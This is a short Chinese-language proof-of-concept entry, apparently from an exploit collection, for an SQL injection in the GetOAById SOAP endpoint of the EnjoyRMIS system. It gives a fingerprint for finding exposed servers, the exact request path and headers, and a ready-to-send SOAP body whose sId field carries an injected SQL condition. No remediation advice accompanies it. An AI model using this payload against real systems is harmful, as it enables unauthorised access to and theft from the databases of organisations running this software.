# EnjoyRMIS-GetOAById存在SQL注入漏洞

- **系统**：EnjoyRMIS　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="CheckSilverlightInstalled"`
- **请求**：`POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetOAById"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetOAById xmlns="http://tempuri.org/">
<sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
</GetOAById>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—